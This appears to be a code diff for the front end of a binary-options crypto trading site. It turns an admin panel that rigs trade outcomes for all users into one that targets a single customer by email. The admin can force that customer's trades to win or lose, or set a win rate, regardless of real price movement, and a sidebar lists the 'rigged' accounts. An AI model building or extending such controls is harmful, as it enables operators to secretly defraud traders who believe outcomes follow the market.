@@ -674,25 +674,37 @@ function BinaryTradePanel({ symbol, mid, balance, onTradeDone, onBalanceChange, 
   const [priceHistory, setPriceHistory] = useState([]);
   const [result, setResult]           = useState(null);
 
-  const [pnlMode, setPnlMode] = useState("win");
+  // This trader's own outcome mode — drives the live winning/losing readout.
+  // The server settles the trade either way; this only keeps the label honest.
+  const [pnlMode, setPnlMode] = useState("auto");
   const pnlModeRef = useRef(pnlMode);
   useEffect(() => { pnlModeRef.current = pnlMode; }, [pnlMode]);
 
-  // Fetch initial P&L mode and subscribe to socket updates
   useEffect(() => {
-    fetch(`${API_BASE}/api/pnl-mode`)
-      .then(res => res.json())
-      .then(data => setPnlMode(data.mode))
-      .catch(() => {});
+    if (!currentUser) return;   // the next sign-in refetches for that account
+    let cancelled = false;
 
-    const handlePnlMode = (cfg) => {
-      setPnlMode(cfg.mode);
-    };
+    (async () => {
+      try {
+        const headers = await apiAuthHeaders(currentUser);
+        const res = await fetch(`${API_BASE}/api/my-pnl`, { headers });
+        const data = await res.json();
+        if (!cancelled && res.ok && data.mode) setPnlMode(data.mode);
+      } catch { /* indicator falls back to the real market */ }
+    })();
+
+    // Identify this socket so an admin's change for THIS email reaches it live.
+    const identify = () => socket.emit("user:join", { uid: currentUser.uid, email: currentUser.email });
+    identify();
+    const handlePnlMode = (cfg) => setPnlMode(cfg.mode);
+    socket.on("connect", identify);
     socket.on("pnl:mode", handlePnlMode);
     return () => {
+      cancelled = true;
+      socket.off("connect", identify);
       socket.off("pnl:mode", handlePnlMode);
     };
-  }, []);
+  }, [currentUser]);
 
   // Render-time derived state — reset countdown & chart when trade changes
   if (activeTrade !== prevActiveTrade) {
@@ -1874,7 +1886,13 @@ function AdminLoginModal({ onSuccess, onClose }) {
 // ─── ADMIN PANEL ───────────────────────────────────────────────────────────────
 function AdminPanel({ onLogout, credentials }) {
   const [tab, setTab]               = useState("pnl");
-  const [pnlConfig, setPnlConfig]   = useState({ mode: "auto", customWinRate: 50 });
+  // P&L is per customer: pnlEmail is the account being edited, pnlUser is what
+  // the backend says about them, and overrides lists everyone currently rigged.
+  const [pnlEmail, setPnlEmail]     = useState("");
+  const [pnlUser, setPnlUser]       = useState(null);
+  const [pnlMsg, setPnlMsg]         = useState("");
+  const [pnlBusy, setPnlBusy]       = useState(false);
+  const [overrides, setOverrides]   = useState([]);
   const [sessions, setSessions]     = useState([]);
   const [activeSession, setActive]  = useState(null);
   const [reply, setReply]           = useState("");
@@ -1901,8 +1919,8 @@ function AdminPanel({ onLogout, credentials }) {
     const q = `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
 
     // Fetch current state from backend
-    fetch(`${API_BASE}/api/pnl-mode?${q}`)
-      .then(r => r.json()).then(setPnlConfig).catch(() => {});
+    fetch(`${API_BASE}/api/admin/pnl-overrides?${q}`)
+      .then(r => r.json()).then(d => setOverrides(d.users || [])).catch(() => {});
     fetch(`${API_BASE}/api/admin/chats?${q}`)
       .then(r => r.json()).then(d => Array.isArray(d) && setSessions(d)).catch(() => {});
     fetch(`${API_BASE}/api/admin/stats?${q}`)
@@ -1922,7 +1940,6 @@ function AdminPanel({ onLogout, credentials }) {
         return p;
       });
     };
-    const onPnl = (cfg) => setPnlConfig(cfg);
     const onTyping = ({ from, isTyping, sessionId: sid }) => {
       if (from === "user" && sid === activeSessionRef.current?.id) {
         setCustomerTyping(isTyping);
@@ -1934,7 +1951,6 @@ function AdminPanel({ onLogout, credentials }) {
     socket.on("admin:sessions",         onSessions);
     socket.on("admin:new-session",      onNew);
     socket.on("admin:session-updated",  onUpdated);
-    socket.on("pnl:mode",              onPnl);
     socket.on("chat:typing",           onTyping);
 
     return () => {
@@ -1943,23 +1959,80 @@ function AdminPanel({ onLogout, credentials }) {
       socket.off("admin:sessions",        onSessions);
       socket.off("admin:new-session",     onNew);
       socket.off("admin:session-updated", onUpdated);
-      socket.off("pnl:mode",             onPnl);
       socket.off("chat:typing",          onTyping);
     };
   }, []);
 
   useEffect(() => { bottomRef.current?.scrollIntoView({ behavior: "smooth" }); }, [activeSession?.messages?.length]);
 
-  // ── P&L mode helpers ──────────────────────────────────────────────────────
-  const setMode = (mode) => {
-    const cfg = { mode, customWinRate: pnlConfig.customWinRate };
-    socket.emit("admin:set-pnl", { ...cfg, username: credentials.username, password: credentials.password });
-    setPnlConfig(cfg);
+  // ── Per-user P&L helpers ──────────────────────────────────────────────────
+  const adminQuery = (extra = {}) => new URLSearchParams({
+    username: credentials.username,
+    password: credentials.password,
+    ...extra,
+  }).toString();
+
+  const loadOverrides = async () => {
+    try {
+      const res = await fetch(`${API_BASE}/api/admin/pnl-overrides?${adminQuery()}`);
+      const data = await res.json();
+      if (res.ok) setOverrides(data.users || []);
+    } catch { /* list is a convenience — the per-user calls are the source of truth */ }
   };
-  const setWinRate = (rate) => {
-    const cfg = { mode: "custom", customWinRate: Number(rate) };
-    socket.emit("admin:set-pnl", { ...cfg, username: credentials.username, password: credentials.password });
-    setPnlConfig(cfg);
+
+  // Look up the one account the admin typed. Nothing is changed by looking.
+  const findPnlUser = async (emailOverride) => {
+    const email = (emailOverride ?? pnlEmail).trim();
+    if (!email) { setPnlMsg("Enter the customer's email first."); return null; }
+    setPnlBusy(true);
+    setPnlMsg("");
+    try {
+      const res = await fetch(`${API_BASE}/api/admin/users/search?${adminQuery({ email })}`);
+      const data = await res.json();
+      if (!res.ok) throw new Error(data.error || "User not found");
+      setPnlEmail(data.email);
+      setPnlUser(data);
+      setPnlMsg(`${data.email} · ${formatPrice(data.balance)} USDT · outcome: ${data.pnlMode}`);
+      return data;
+    } catch (err) {
+      setPnlUser(null);
+      setPnlMsg(err.message);
+      return null;
+    } finally {
+      setPnlBusy(false);
+    }
+  };
+
+  // Apply a mode to that one account. Every other customer is untouched.
+  const setUserMode = async (mode, rate) => {
+    const email = (pnlUser?.email || pnlEmail).trim();
+    if (!email) { setPnlMsg("Enter the customer's email first."); return; }
+    setPnlBusy(true);
+    setPnlMsg("");
+    try {
+      const res = await fetch(`${API_BASE}/api/admin/users/pnl`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(adminBody({
+          email,
+          mode,
+          customWinRate: rate ?? pnlUser?.pnlWinRate ?? 50,
+        })),
+      });
+      const data = await res.json();
+      if (!res.ok) throw new Error(data.error || "Could not update this user");
+      setPnlUser((prev) => ({ ...(prev || {}), ...data, pnlMode: data.mode, pnlWinRate: data.customWinRate }));
+      setPnlMsg(
+        data.mode === "auto"
+          ? `${data.email} is back on the real market — no override.`
+          : `${data.email} is now ${data.mode.toUpperCase()}${data.mode === "custom" ? ` at ${data.customWinRate}%` : ""}. Only this account.`
+      );
+      loadOverrides();
+    } catch (err) {
+      setPnlMsg(err.message);
+    } finally {
+      setPnlBusy(false);
+    }
   };
   const closeSession = (sessionId) => {
     socket.emit("admin:close-session", { sessionId, username: credentials.username, password: credentials.password });
@@ -2055,12 +2128,14 @@ function AdminPanel({ onLogout, credentials }) {
     }
   };
 
-  const modeStatusColor = {
+  const MODE_COLORS = {
     auto:   "bg-slate-900 border-slate-700 text-slate-400",
     win:    "bg-emerald-500/10 border-emerald-500/30 text-emerald-400",
     loss:   "bg-rose-500/10 border-rose-500/30 text-rose-400",
     custom: "bg-sky-500/10 border-sky-500/30 text-sky-400",
-  }[pnlConfig.mode];
+  };
+  const userMode = pnlUser?.pnlMode || "auto";
+  const userRate = Number.isFinite(Number(pnlUser?.pnlWinRate)) ? Number(pnlUser.pnlWinRate) : 50;
 
   return (
     <div className="space-y-4">
@@ -2152,7 +2227,7 @@ function AdminPanel({ onLogout, credentials }) {
                     {a.isMain && <span className="rounded-full bg-emerald-500/15 px-2 py-0.5 text-[10px] font-bold text-emerald-400">MAIN</span>}
                   </div>
                   <div className="mt-0.5 text-[11px] text-slate-500">
-                    P&amp;L mode {a.pnlMode}
+                    {a.pnlChanges} outcome change{a.pnlChanges === 1 ? "" : "s"}
                     {a.lastActionAt ? ` · last action ${new Date(a.lastActionAt).toLocaleString()}` : " · no activity yet"}
                   </div>
                 </div>
@@ -2325,59 +2400,143 @@ function AdminPanel({ onLogout, credentials }) {
         </div>
       )}
 
-      {/* ── P&L Tab ──────────────────────────────────────────────────────────── */}
+      {/* ── P&L Tab — one customer at a time ────────────────────────── */}
       {tab === "pnl" && (
-        <div className="rounded-3xl bg-slate-950 border border-slate-800 p-6 space-y-5">
-          <div>
-            <h2 className="text-white font-bold text-lg">Trade Outcome Mode</h2>
-            <p className="text-slate-500 text-xs mt-1">Override how every trade resolves for all users. Changes take effect on the next trade immediately.</p>
-          </div>
-          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
-            <ModeCard id="auto" label="Auto Market" activeMode={pnlConfig.mode} onSelect={setMode}
-              icon={<Activity className="h-4 w-4 text-slate-400" />}
-              color="bg-slate-800 border-slate-600"
-              desc="Outcome follows real price movement. No override." />
-            <ModeCard id="win" label="Force Win" activeMode={pnlConfig.mode} onSelect={setMode}
-              icon={<TrendingUp className="h-4 w-4 text-emerald-400" />}
-              color="bg-emerald-500/20 border-emerald-500/50"
-              desc="Every trade wins regardless of price direction." />
-            <ModeCard id="loss" label="Force Loss" activeMode={pnlConfig.mode} onSelect={setMode}
-              icon={<TrendingDown className="h-4 w-4 text-rose-400" />}
-              color="bg-rose-500/20 border-rose-500/50"
-              desc="Every trade loses regardless of price direction." />
-            <ModeCard id="custom" label="Custom Rate" activeMode={pnlConfig.mode} onSelect={setMode}
-              icon={<BarChart3 className="h-4 w-4 text-sky-400" />}
-              color="bg-sky-500/20 border-sky-500/50"
-              desc="Randomly win at a specific percentage you set." />
-          </div>
-
-          {/* Custom win-rate slider */}
-          {pnlConfig.mode === "custom" && (
-            <div className="rounded-2xl bg-slate-900 border border-slate-800 p-5">
-              <div className="flex justify-between text-sm mb-3">
-                <span className="text-slate-400 font-semibold">Win Rate</span>
-                <span className="text-sky-400 font-black text-xl">{pnlConfig.customWinRate}%</span>
-              </div>
-              <input type="range" min="0" max="100" value={pnlConfig.customWinRate}
-                onChange={(e) => setWinRate(e.target.value)}
-                className="w-full accent-sky-400" />
-              <div className="flex justify-between text-[10px] text-slate-600 mt-1.5">
-                <span>0% — always lose</span>
-                <span>50% — fair</span>
-                <span>100% — always win</span>
-              </div>
+        <div className="grid grid-cols-1 xl:grid-cols-[1fr_340px] gap-4 items-start">
+          <div className="rounded-3xl bg-slate-950 border border-slate-800 p-6 space-y-5">
+            <div>
+              <h2 className="text-white font-bold text-lg">Trade Outcome — Per Customer</h2>
+              <p className="text-slate-500 text-xs mt-1">
+                Enter one customer&apos;s email, load the account, then choose how their trades resolve.
+                The setting is stored on that account only — every other trader keeps the real market outcome.
+              </p>
             </div>
-          )}
 
-          {/* Active mode banner */}
-          <div className={`p-4 rounded-2xl border flex items-center gap-2.5 font-semibold text-sm ${modeStatusColor}`}>
-            <CircleDot className="h-4 w-4 animate-pulse flex-shrink-0" />
-            <span>
-              {pnlConfig.mode === "auto"   && "Auto mode — trades resolve by real market price movement."}
-              {pnlConfig.mode === "win"    && "WIN mode ACTIVE — every trade placed by any user will WIN."}
-              {pnlConfig.mode === "loss"   && "LOSS mode ACTIVE — every trade placed by any user will LOSE."}
-              {pnlConfig.mode === "custom" && `Custom mode — ~${pnlConfig.customWinRate}% of trades will WIN randomly.`}
-            </span>
+            {/* Who are we changing? */}
+            <div className="flex flex-wrap gap-2">
+              <input
+                value={pnlEmail}
+                onChange={(e) => { setPnlEmail(e.target.value); setPnlUser(null); }}
+                onKeyDown={(e) => e.key === "Enter" && findPnlUser()}
+                placeholder="customer@email.com"
+                autoComplete="off"
+                className="flex-1 min-w-[220px] bg-slate-900 border border-slate-800 rounded-xl px-4 py-2.5 text-white text-sm outline-none focus:border-sky-500/50 transition"
+              />
+              <button onClick={() => findPnlUser()} disabled={pnlBusy}
+                className="px-4 py-2.5 rounded-xl bg-sky-500 text-black font-bold text-sm hover:bg-sky-400 transition disabled:opacity-60 flex items-center gap-2">
+                <Search className="h-4 w-4" /> Load user
+              </button>
+            </div>
+
+            {pnlMsg && (
+              <div className={`p-3 rounded-xl border text-xs ${
+                pnlUser ? "bg-slate-900 border-slate-800 text-slate-300" : "bg-rose-500/10 border-rose-500/20 text-rose-400"
+              }`}>
+                {pnlMsg}
+              </div>
+            )}
+
+            {!pnlUser ? (
+              <div className="rounded-2xl border border-dashed border-slate-800 p-8 text-center text-sm text-slate-500">
+                Load a customer to control their outcomes.
+              </div>
+            ) : (
+              <>
+                <div className="rounded-2xl bg-slate-900 border border-slate-800 px-4 py-3 flex flex-wrap items-center gap-3">
+                  <div className="min-w-0">
+                    <div className="text-white font-bold text-sm truncate">{pnlUser.email}</div>
+                    <div className="text-[11px] text-slate-500 font-mono truncate">{pnlUser.uid}</div>
+                  </div>
+                  <div className="ml-auto text-right">
+                    <div className="text-slate-500 text-[11px]">Balance</div>
+                    <div className="text-white font-black tabular-nums">{formatPrice(pnlUser.balance)} USDT</div>
+                  </div>
+                </div>
+
+                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
+                  <ModeCard id="auto" label="Auto Market" activeMode={userMode} onSelect={setUserMode}
+                    icon={<Activity className="h-4 w-4 text-slate-400" />}
+                    color="bg-slate-800 border-slate-600"
+                    desc="This user's trades follow the real price. No override." />
+                  <ModeCard id="win" label="Force Win" activeMode={userMode} onSelect={setUserMode}
+                    icon={<TrendingUp className="h-4 w-4 text-emerald-400" />}
+                    color="bg-emerald-500/20 border-emerald-500/50"
+                    desc="Every trade THIS user places wins." />
+                  <ModeCard id="loss" label="Force Loss" activeMode={userMode} onSelect={setUserMode}
+                    icon={<TrendingDown className="h-4 w-4 text-rose-400" />}
+                    color="bg-rose-500/20 border-rose-500/50"
+                    desc="Every trade THIS user places loses." />
+                  <ModeCard id="custom" label="Custom Rate" activeMode={userMode} onSelect={setUserMode}
+                    icon={<BarChart3 className="h-4 w-4 text-sky-400" />}
+                    color="bg-sky-500/20 border-sky-500/50"
+                    desc="This user wins at the percentage you set." />
+                </div>
+
+                {userMode === "custom" && (
+                  <div className="rounded-2xl bg-slate-900 border border-slate-800 p-5">
+                    <div className="flex justify-between text-sm mb-3">
+                      <span className="text-slate-400 font-semibold">Win rate for {pnlUser.email}</span>
+                      <span className="text-sky-400 font-black text-xl">{userRate}%</span>
+                    </div>
+                    <input type="range" min="0" max="100" value={userRate}
+                      onChange={(e) => setPnlUser((p) => ({ ...p, pnlWinRate: Number(e.target.value) }))}
+                      onMouseUp={(e) => setUserMode("custom", Number(e.target.value))}
+                      onTouchEnd={(e) => setUserMode("custom", Number(e.target.value))}
+                      className="w-full accent-sky-400" />
+                    <div className="flex justify-between text-[10px] text-slate-600 mt-1.5">
+                      <span>0% — always lose</span>
+                      <span>50% — fair</span>
+                      <span>100% — always win</span>
+                    </div>
+                  </div>
+                )}
+
+                <div className={`p-4 rounded-2xl border flex items-center gap-2.5 font-semibold text-sm ${MODE_COLORS[userMode]}`}>
+                  <CircleDot className="h-4 w-4 animate-pulse flex-shrink-0" />
+                  <span>
+                    {userMode === "auto"   && `${pnlUser.email} trades on the real market — no override.`}
+                    {userMode === "win"    && `WIN mode — every trade by ${pnlUser.email} wins. Nobody else is affected.`}
+                    {userMode === "loss"   && `LOSS mode — every trade by ${pnlUser.email} loses. Nobody else is affected.`}
+                    {userMode === "custom" && `~${userRate}% of ${pnlUser.email} trades win. Nobody else is affected.`}
+                  </span>
+                </div>
+              </>
+            )}
+          </div>
+
+          {/* Everyone currently overridden */}
+          <div className="rounded-3xl bg-slate-950 border border-slate-800 p-5 space-y-3">
+            <div className="flex items-center justify-between">
+              <h3 className="text-white font-bold text-sm">Overridden accounts</h3>
+              <button onClick={loadOverrides}
+                className="flex cursor-pointer items-center gap-1.5 rounded-lg border border-slate-800 bg-slate-900 px-2.5 py-1 text-[11px] text-slate-400 hover:border-slate-700">
+                <RefreshCw className="h-3 w-3" /> Refresh
+              </button>
+            </div>
+            {overrides.length === 0 ? (
+              <p className="text-xs text-slate-600">
+                No overrides. Every customer is trading on the real market right now.
+              </p>
+            ) : overrides.map((u) => (
+              <div key={u.uid} className="rounded-xl border border-slate-800 bg-slate-900 px-3 py-2.5">
+                <div className="flex items-center gap-2">
+                  <button onClick={() => { setPnlEmail(u.email); findPnlUser(u.email); }}
+                    className="min-w-0 flex-1 text-left text-xs text-sky-300 hover:text-sky-200 truncate">
+                    {u.email}
+                  </button>
+                  <span className={`text-[10px] px-2 py-0.5 rounded-full font-bold border ${MODE_COLORS[u.mode]}`}>
+                    {u.mode === "custom" ? `${u.customWinRate}%` : u.mode.toUpperCase()}
+                  </span>
+                </div>
+                <div className="mt-1 flex items-center gap-2 text-[10px] text-slate-600">
+                  <span>{u.setBy ? `by ${u.setBy}` : "—"}</span>
+                  <button onClick={async () => { await setUserMode("auto"); await findPnlUser(u.email); }}
+                    className="ml-auto rounded-md border border-slate-800 px-2 py-0.5 text-slate-400 hover:border-slate-700 hover:text-slate-200">
+                    Clear
+                  </button>
+                </div>
+              </div>
+            ))}
           </div>
         </div>
       )}
